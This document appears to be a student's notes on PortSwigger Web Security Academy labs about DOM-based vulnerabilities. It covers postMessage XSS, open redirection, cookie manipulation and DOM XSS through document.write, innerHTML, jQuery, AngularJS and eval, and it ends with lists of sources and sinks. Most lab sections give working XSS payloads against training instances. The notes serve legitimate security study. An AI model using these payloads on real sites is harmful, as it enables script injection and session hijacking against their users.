<span style="color:yellow;font-weight:700;font-size:30px">
DOM-based vulnerabilities (general)
</span>
https:portswigger.net/web-security/dom-based


<!-- # materials: what is window.postmessage():
https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage -->

**Controlling the web message source (3 labs)**

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
#
# ***1. Lab: DOM XSS using web messages***
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages

hint:
```htm
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

1. look for messages listners / innerHTML object - find in response to home (GET / HTTP/1.1):
```htm
    <script>
        window.addEventListener('message', function(e) {
            document.getElementById('ads').innerHTML = e.data;
        })
    </script>
```

2. load the hinted code with labs url and **\<img>** tag based onerror event handler:
```htm
<iframe src="https://0a85009c04059966c0d325d100d6002c.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print(1)>','*')">
```
avoid apos char at: src='x' and onerror='print()'. they break the payload here

# DOMed!


# ***2.  Lab: DOM XSS using web messages and a JavaScript URL*** 
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

look for vulnarble JS functions by finding script>tag in responses:
find:
```htm
    <script>
        window.addEventListener('message', function(e) {
            var url = e.data;
            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                location.href = url;
            }
        }, false);
    </script>
```

so payload must start with 'http:' or 'https:' to be executed. lets try to pass arbitary url with hashed payload:

possible payloads:
```htm
<iframe src="https://0aab0039049cb659c0c402b200f800de.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()<!--http:','*')">

<iframe src="https://0aab0039049cb659c0c402b200f800de.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```
<!-- 
learned: use javascript: pseudo protocol in urls
https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/ -->


# DOMed!

# ***3.  Lab: DOM XSS using web messages and JSON.parse*** 
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

look for vulnarble script> tags at proxie - find:
```htm
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
from 3 possible actions: **scroll**, **load** and **change style**. lets try load as a possible vector.
jason:
```htm
{"type":"load-channel", "data":"javascript:print()//"}
```
```htm
<iframe src="https://0a2500af039e943bc0f65f0c0025000f.web-security-academy.net" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
```
<!-- 
**learned:**
d.url == field name is url (not "data" you dummy)
escape the " in the jason to avoid breaking the outer iframe shell -->

# DUDE!


# DOM-based open redirection (1 lab)
https://portswigger.net/web-security/dom-based/open-redirection

# ***1.  Lab: DOM-based open redirection*** 
https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

look for keyword url in response - find in post pages (GET /post?postId=1 HTTP/1.1):
```htm
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
</div>
```

**portswigger solution:**
https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/

**payload:**
https://0ad300bc03e07eacc1b32b24000900f0.web-security-academy.net/post?postId=1&url=https://exploit-0ab1006e03af7ee6c1892b8c011f001f.web-security-academy.net/exploit

(of course in the exploit page needs to be a badass maliciouse code)


# DOM-based cookie manipulation (1 lab)
https://portswigger.net/web-security/dom-based/cookie-manipulation


# ***1.  Lab: DOM-based cookie manipulation*** 
https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

hint:
document.cookie = 'cookieName='+location.hash.slice(1);

serach keyword cookie to find cookie related vulnarbilties - find in page (GET /product?productId=3 HTTP/1.1)
```htm
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

this script creates a link to our last seen product
```htm
<script>
    document.cookie = 'lastViewedProduct=' + location.hash.slice(1) + '; SameSite=None; Secure'
</script>
```

portswigger solution:
```htm
<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
```

<!-- i guess the onload works as follow:
check if window.x (arbitary var?) has value and if he does we redirect iframe to the second url value; after we load the window.x with value to make sure it resualts to true to fire the onload handler.

not sure why window.x only being loaded in the end
not sure why use the if clause and not redirect otherwise

but still - supercool -->

payload:
```htm
<iframe src="https://0a900063030848c7c03f08790046001e.web-security-academy.net/product?productId=3&'><script>print()</script>" onload="if(!window.x)this.src='https://0a900063030848c7c03f08790046001e.web-security-academy.net';window.x=1">
```

# DOMed!


# DOM-based XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data

# ***1.Lab: DOM XSS in document.write sink using source location.search ***
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

original Java script:
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }

full path:
    GET /?search=">'<script>alert(document.domain)</script><"' HTTP/1.1

payload:
    ">'<script>alert(document.domain)</script><"'


# ***2. Lab: DOM XSS in document.write sink using source location.search inside a select element***
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

original Java script:
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');

**payload**:
> <script>alert(1)</script>


full path
> GET /product?productId=3&storeId=<script>alert(1)</script> HTTP/1.1
(i didnt close the tags - just wrote the script since it reflects as is anyway...)

portswiggers solution: 
>GET /product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)> HTTP/1.1



# ***3. Lab: DOM XSS in innerHTML sink using source location.search***
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

original Java script:
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }

payload:
> <img%20src=1%20onerror=alert(1)>

full path:
> GET /?search=<img%20src=1%20onerror=alert(1)> HTTP/1.

# ***4. Lab: DOM XSS in jQuery anchor href attribute sink using location.search source***
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink


original script:
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });

**payload**:
> ?returnPath=javascript:alert(document.domain)

full path:
>GET /feedback?returnPath=javascript:alert(document.domain) HTTP/1.1

# ***5. Lab: DOM XSS in jQuery selector sink using a hashchange event***
https:/portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

original script:
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });

payload format:
> <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print(1)>'">

**final payload:**
> <iframe src="https://ac201fda1fe56926c03d960700870032.web-security-academy.net#" onload="this.src+='<img src=1 onerror=alert(1)>'">
to be stored on attacker server and deliverd as url


# ***6. Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded***
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

vulnerable code:
    <body ng-app="" class="ng-scope">
        <input type="text" placeholder="Search the blog..." name="search">
  
**payload:**
> {{$on.constructor('alert(1)')()}}

full path:
> GET /?search={{$on.constructor('alert(1)')()}} HTTP/1.1

# ***7. Lab: DOM XSS combined with reflected and stored data***
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

original script:
    function search(path) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                eval('var searchResultsObj = ' + this.responseText);
                displaySearchResults(searchResultsObj);
            }
        };
        xhr.open("GET", path + window.location.search);
        xhr.send();

the vulnrable line:
> eval('var searchResultsObj = ' + this.responseText)

**payload:**
> \"-alert(1)}//

full payload request:
> eval('var searchResultsObj = ' +  \"-alert(1)}//
respinse:
    HTTP/1.1 200 OK

    {"results":[],"searchTerm":" \\"-alert(1)}//

# ***8. Lab: Stored DOM XSS**
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

payload:
> <><img src=1 onerror=alert(1)>

the website uses the JavaScript replace() function
including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected,


# **materials:**

# Portwsigger cheetsheet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# **Which sinks can lead to DOM-XSS vulnerabilities?**

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
    document.write()
    document.writeln()
    document.domain
    element.innerHTML
    element.outerHTML
    element.insertAdjacentHTML
    element.onevent

 The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
    add()
    after()
    append()
    animate()
    insertAfter()
    insertBefore()
    before()
    html()
    prepend()
    replaceAll()
    replaceWith()
    wrap()
    wrapInner()
    wrapAll()
    has()
    constructor()
    init()
    index()
    jQuery.parseHTML()
    $.parseHTML()


 The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
    document.URL
    document.documentURI
    document.URLUnencoded
    document.baseURI
    location
    document.cookie
    document.referrer
    window.name
    history.pushState
    history.replaceState
    localStorage
    sessionStorage
    IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
    Database


    DOM-based vulnerability 	Example sink
    DOM XSS LABS 	document.write()
    Open redirection LABS 	window.location
    Cookie manipulation LABS 	document.cookie
    JavaScript injection 	eval()
    Document-domain manipulation 	document.domain
    WebSocket-URL poisoning 	WebSocket()
    Link manipulation 	element.src
    Web message manipulation 	postMessage()
    Ajax request-header manipulation 	setRequestHeader()
    Local file-path manipulation 	FileReader.readAsText()
    Client-side SQL injection 	ExecuteSql()
    HTML5-storage manipulation 	sessionStorage.setItem()
    Client-side XPath injection 	document.evaluate()
    Client-side JSON injection 	JSON.parse()
    DOM-data manipulation 	element.setAttribute()
    Denial of service 	RegExp()
